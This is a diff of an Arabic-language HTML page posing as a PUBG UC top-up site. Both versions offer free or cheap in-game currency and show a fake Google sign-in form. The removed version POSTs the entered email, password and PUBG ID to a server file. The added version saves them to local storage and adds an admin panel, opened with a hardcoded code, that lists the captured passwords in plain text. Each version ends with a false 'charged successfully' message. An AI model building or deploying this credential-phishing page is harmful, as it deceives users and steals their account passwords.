@@ -1,192 +1,175 @@
-<!DOCTYPE html><html lang="ar" dir="rtl">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>موقع شحن شدات ببجي</title>
-  <style>
-    :root {
-      --dark-blue: #0d1b2a;
-      --light-bg: #f0f0f0;
-      --dark-text: #e0e0e0;
-      --light-text: #333;
-    }
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: var(--dark-blue);
-      color: var(--dark-text);
-      transition: background-color 0.3s, color 0.3s;
-    }
-    .light-mode {
-      background-color: var(--light-bg);
-      color: var(--light-text);
-    }
-    header {
-      padding: 1rem;
-      text-align: center;
-      background: #1b263b;
-      color: white;
-    }
-    .toggle-mode {
-      margin-top: 1rem;
-      padding: 0.5rem 1rem;
-      background: #415a77;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-    .toggle-mode:active {
-      transform: scale(0.95);
-    }
-    .container {
-      padding: 2rem;
-      max-width: 600px;
-      margin: auto;
-    }
-    .google-login-form {
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-      margin-top: 1rem;
-    }
-    input {
-      padding: 0.6rem;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    .submit-btn, .confirm-btn {
-      background: #4285f4;
-      color: white;
-      padding: 0.7rem 1.2rem;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: transform 0.1s;
-    }
-    .submit-btn:active, .confirm-btn:active {
-      transform: scale(0.95);
-    }
-    .stats {
-      margin-top: 2rem;
-      font-size: 1.2rem;
-    }
-    .offers {
-      margin-top: 2rem;
-      padding: 1rem;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      background-color: #1e2a3a;
-    }
-    .offer {
-      margin-bottom: 1rem;
-      padding: 1rem;
-      background-color: #324863;
-      border-radius: 8px;
-      color: white;
-      cursor: pointer;
-    }
-    .hidden {
-      display: none;
-    }
-    .loading-bar {
-      width: 0;
-      height: 10px;
-      background: lime;
-      margin-top: 10px;
-      transition: width 2s linear;
-    }
-    .success-msg {
-      color: lightgreen;
-      font-weight: bold;
-      margin-top: 1rem;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>موقع احترافي</title>
+<style>
+  body {
+    background: #0d1b2a;
+    color: #e0e0e0;
+    font-family: Arial, sans-serif;
+    padding: 1rem;
+  }
+  input, button {
+    padding: 0.5rem;
+    margin: 0.3rem 0;
+    border-radius: 5px;
+    border: none;
+  }
+  button {
+    background: #4285f4;
+    color: white;
+    cursor: pointer;
+  }
+  #adminPanel {
+    background: #222;
+    padding: 1rem;
+    margin-top: 1rem;
+    display: none;
+    max-height: 300px;
+    overflow-y: auto;
+  }
+  #adminPanel h3 {
+    color: #f33;
+  }
+</style>
 </head>
 <body>
-  <header>
-    <h1>مرحبا بك في الموقع شحن شداد ببجي</h1>
-    <button class="toggle-mode" onclick="toggleMode()">تبديل الوضع النهاري / الليلي</button>
-  </header>  <div class="container">
-    <h2>تسجيل الدخول بحساب Google (حقيقي)</h2>
-    <form class="google-login-form" onsubmit="return validateLogin()">
-      <input type="email" id="email" placeholder="البريد الإلكتروني" required />
-      <input type="password" id="password" placeholder="كلمة المرور" required />
-      <button type="submit" class="submit-btn">تسجيل الدخول</button>
-    </form><div class="stats">
-  <p>عدد الزوار: <strong id="visitor-count">19,715,016</strong></p>
-</div>
 
-<div class="offers hidden" id="offers">
+<h2>تسجيل الدخول بحساب Google (وهمي)</h2>
+<form id="loginForm">
+  <input type="email" id="email" placeholder="البريد الإلكتروني" required /><br/>
+  <input type="password" id="password" placeholder="كلمة المرور" required /><br/>
+  <button type="submit">تسجيل الدخول</button>
+</form>
+
+<div id="offers" style="display:none;">
   <h3>عروض شدات ببجي</h3>
-  <div class="offer" onclick="startProcess('1000 مجاني')">1000 شدة - مجاني</div>
-  <div class="offer" onclick="startProcess('2000 - 5 دولار')">2000 شدة - 5 دولار</div>
-  <div class="offer" onclick="startProcess('3000 - 6 دولار')">3000 شدة - 6 دولار</div>
-
-  <div class="hidden" id="loading">
-    <p>جاري المعالجة...</p>
-    <div class="loading-bar" id="loading-bar"></div>
+  <button onclick="startProcess('1000 مجاني')">1000 شدة - مجاني</button>
+  <button onclick="startProcess('2000 - 5 دولار')">2000 شدة - 5 دولار</button>
+  <button onclick="startProcess('3000 - 6 دولار')">3000 شدة - 6 دولار</button>
+  
+  <div id="loading" style="display:none; margin-top: 10px;">
+    جاري المعالجة...
+    <div style="width: 0; height: 10px; background: lime;" id="loadingBar"></div>
+  </div>
+  
+  <div id="idForm" style="display:none; margin-top: 10px;">
+    <input type="text" id="pubgId" placeholder="أدخل ID ببجي" />
+    <button onclick="submitID()">موافق</button>
   </div>
 
-  <div class="hidden" id="id-form">
-    <input type="text" id="pubg-id" placeholder="أدخل ID ببجي" />
-    <button class="confirm-btn" onclick="submitID()">موافق</button>
+  <div id="successMsg" style="display:none; color: lightgreen; margin-top: 10px;">
+    تم الشحن بنجاح ✔️
   </div>
-
-  <div class="success-msg hidden" id="success">تم الشحن بنجاح ✔️</div>
 </div>
 
-  </div>  <script>
-    let selectedOffer = "";
+<hr/>
 
-    function toggleMode() {
-      document.body.classList.toggle("light-mode");
+<button onclick="showAdminLogin()">دخول الإدمن</button>
+
+<div id="adminLogin" style="display:none; margin-top:10px;">
+  <input type="password" id="adminCode" placeholder="أدخل رمز الإدمن" />
+  <button onclick="checkAdmin()">دخول</button>
+</div>
+
+<div id="adminPanel">
+  <h3>بيانات المستخدمين المسجلة</h3>
+  <div id="userDataList"></div>
+</div>
+
+<script>
+  let selectedOffer = '';
+
+  const loginForm = document.getElementById('loginForm');
+  const offersDiv = document.getElementById('offers');
+  const loadingDiv = document.getElementById('loading');
+  const loadingBar = document.getElementById('loadingBar');
+  const idForm = document.getElementById('idForm');
+  const successMsg = document.getElementById('successMsg');
+
+  const adminLoginDiv = document.getElementById('adminLogin');
+  const adminPanel = document.getElementById('adminPanel');
+  const userDataList = document.getElementById('userDataList');
+
+  loginForm.addEventListener('submit', function(e){
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    if(email.endsWith('@gmail.com') && password.length >= 6){
+      alert('تم تسجيل الدخول بنجاح (محاكاة)');
+      offersDiv.style.display = 'block';
+    } else {
+      alert('يرجى إدخال بيانات صحيحة.');
+    }
+  });
+
+  function startProcess(offer){
+    selectedOffer = offer;
+    loadingDiv.style.display = 'block';
+    loadingBar.style.width = '0%';
+    idForm.style.display = 'none';
+    successMsg.style.display = 'none';
+
+    setTimeout(() => {
+      loadingBar.style.width = '100%';
+    }, 100);
+
+    setTimeout(() => {
+      loadingDiv.style.display = 'none';
+      idForm.style.display = 'block';
+    }, 2100);
+  }
+
+  function submitID(){
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const pubgId = document.getElementById('pubgId').value.trim();
+
+    if(pubgId === ''){
+      alert('يرجى إدخال ID ببجي صحيح');
+      return;
     }
 
-    function validateLogin() {
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+    // حفظ البيانات في localStorage
+    let storedData = JSON.parse(localStorage.getItem('userData') || '[]');
+    storedData.push({ email, password, pubgId, offer: selectedOffer, date: new Date().toLocaleString() });
+    localStorage.setItem('userData', JSON.stringify(storedData));
 
-      if (email.endsWith("@gmail.com") && password.length >= 6) {
-        alert("تم تسجيل الدخول بنجاح (محاكاة)");
-        document.getElementById("offers").classList.remove("hidden");
-      } else {
-        alert("يرجى إدخال بيانات صحيحة.");
-      }
-      return false;
+    idForm.style.display = 'none';
+    successMsg.style.display = 'block';
+  }
+
+  function showAdminLogin(){
+    adminLoginDiv.style.display = 'block';
+  }
+
+  function checkAdmin(){
+    const code = document.getElementById('adminCode').value.trim();
+    if(code === 'حيدرغرام'){
+      adminLoginDiv.style.display = 'none';
+      showAdminPanel();
+    } else {
+      alert('رمز الإدمن غير صحيح');
     }
+  }
 
-    function startProcess(offer) {
-      selectedOffer = offer;
-      document.getElementById("loading").classList.remove("hidden");
-      const bar = document.getElementById("loading-bar");
-      bar.style.width = "100%";
-
-      setTimeout(() => {
-        document.getElementById("loading").classList.add("hidden");
-        document.getElementById("id-form").classList.remove("hidden");
-      }, 2000);
+  function showAdminPanel(){
+    adminPanel.style.display = 'block';
+    const data = JSON.parse(localStorage.getItem('userData') || '[]');
+    if(data.length === 0){
+      userDataList.innerHTML = '<p>لا توجد بيانات محفوظة.</p>';
+      return;
     }
+    userDataList.innerHTML = data.map((item, i) => `
+      <div style="border-bottom: 1px solid #555; margin-bottom: 5px; padding-bottom: 5px;">
+        <strong>#${i+1}</strong> - البريد: ${item.email} - الباسورد: ${item.password} - ID: ${item.pubgId} - العرض: ${item.offer} - الوقت: ${item.date}
+      </div>
+    `).join('');
+  }
+</script>
 
-    function submitID() {
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-      const pubgId = document.getElementById("pubg-id").value;
-
-      if (pubgId.trim() === "") {
-        alert("يرجى إدخال ID ببجي صحيح");
-        return;
-      }
-
-      fetch("php.txt", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: `email=${email}&password=${password}&pubg_id=${pubgId}&offer=${selectedOffer}`
-      });
-
-      document.getElementById("id-form").classList.add("hidden");
-      document.getElementById("success").classList.remove("hidden");
-    }
-  </script></body>
+</body>
 </html>
